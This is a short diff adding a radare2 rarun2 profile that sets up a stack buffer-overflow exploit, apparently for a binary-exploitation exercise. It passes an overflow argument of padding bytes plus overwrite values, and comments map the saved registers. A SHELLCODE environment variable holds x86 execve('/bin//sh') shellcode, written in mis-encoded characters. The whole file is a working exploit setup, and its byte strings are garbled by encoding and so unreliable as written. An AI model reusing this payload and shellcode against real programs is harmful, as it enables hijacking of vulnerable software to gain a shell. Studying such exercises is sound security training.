@@ -1,0 +1,12 @@
+#!/usr/bin/rarun2
+stdio=/dev/pts/3
+clearenv=true
+arg1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAùﬂˇˇAAAAAAAAAAAAAAAABBBBBBBBCCCCÉp‹ˇˇ
+#in buffer:
+#00000000 ebx
+#00000002 esi
+#080483b0 edi
+#ffffdaec ebp
+#c756c84c esp (mangled)
+#31ecfda3 eip (mangled)
+setenv=SHELLCODE=P‘ˇˇ1¿1€1…1“âÂ1¿Ph//shh/binç$1¿PQã$â·∞ÕÄ
